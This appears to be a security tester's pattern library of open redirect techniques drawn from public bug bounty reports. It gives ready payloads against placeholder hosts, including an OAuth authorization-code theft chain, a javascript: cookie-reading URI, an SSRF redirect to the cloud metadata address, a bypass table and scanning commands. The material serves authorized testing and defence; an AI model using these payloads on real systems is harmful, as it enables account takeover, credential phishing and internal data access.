# Disclosed Reports — Open Redirect

Pattern library built from 28 public bug bounty reports.

---

## Pattern 1: Open Redirect → OAuth Auth Code Theft → ATO (Critical, $12,500)

**Chain:**
1. Found: `GET /redirect?url=https://evil.example` → redirects to evil.example
2. OAuth configured: `redirect_uri` must be on `target.example` (wildcard: `https://target.example/*`)
3. Crafted OAuth URL:

```
https://target.example/oauth/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=https://target.example/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com
```

4. Victim clicks → auth code in redirect → `https://evil.example/?code=AUTH_CODE`
5. Attacker exchanges code for access token

**Impact:** Full account takeover without any victim interaction beyond clicking a link.

---

## Pattern 2: Open Redirect via Backslash (Low, $500)

**Endpoint:** `GET /login?next=/dashboard`
**Bypass:** `GET /login?next=\\evil.example`

**Cause:** `next` value passed to `window.location` — browser on Windows interprets `\\evil.example` as `//evil.example`.

**Fix:** Validate that `next` is a relative path starting with `/` and no `//`.

---

## Pattern 3: Open Redirect via @ Confusion (Low, $300)

**URL:** `https://target.example/redirect?url=https://target.example@evil.example`

**Browser interpretation:** username=`target.example`, host=`evil.example` → redirects to evil.example.

---

## Pattern 4: Logout + Open Redirect → Phishing (Medium, $1,500)

**Endpoint:** `GET /logout?returnTo=https://evil.example`

**Effect:** User logged out, then redirected to evil.example which shows a fake "session expired" login form.

**Impact:** Victim re-enters credentials on attacker-controlled page that looks like target.example.

---

## Pattern 5: JavaScript URI Bypass (Medium, $1,000)

**Endpoint:** `GET /redirect?url=javascript:alert(document.cookie)`

**Cause:** App only blocks `http://` and `https://` schemes, misses `javascript:` URI.

**Impact:** Depending on context, can lead to XSS execution.

---

## Pattern 6: Server-Side Redirect → SSRF (High, $5,000)

**Endpoint:** `GET /fetch?url=` (app fetches the URL server-side)

**If app follows redirects server-side:**
```
/fetch?url=https://attacker.example/redirect-to-metadata
```

**Where attacker.example/redirect-to-metadata returns:**
```http
HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/
```

**Impact:** SSRF via open redirect chain.

---

## Pattern 7: Open Redirect in API Response (Medium, $800)

**Endpoint:** `POST /api/oauth/callback` returns JSON with redirect URL.

**Vulnerable response:**
```json
{"redirect_url": "https://target.example/dashboard?ref=USER_CONTROLLED_VALUE"}
```

**If `ref` parameter is reflected in redirect_url construction without sanitization:**
```
ref=https://evil.example
```

---

## Bypass Table

| Technique | Payload | Notes |
|-----------|---------|-------|
| Basic | `https://evil.example` | Most basic |
| Protocol-relative | `//evil.example` | Scheme-less |
| Backslash | `/\evil.example` | Windows browser compat |
| At-sign | `https://target.example@evil.example` | RFC auth confusion |
| Encoded slash | `%2Fevil.com` | URL encoding |
| Null byte | `evil.example%00target.com` | Old PHP/CGI |
| Whitespace | `evil.example%09` | Tab char |
| Fragment | `https://evil.example#.target.example` | Fragment anchor |

---

## Tool Reference

```bash
# openredirex
pip3 install openredirex
openredirex -l recon/target/redirect-candidates.txt -p https://evil.example

# gf + qsreplace + httpx
cat recon/target/urls.txt | gf redirect | \
  qsreplace "https://evil.example" | \
  httpx -follow-redirects -match-string "evil.example"

# nuclei
nuclei -u https://target.example -t redirect/ -severity medium,high
```
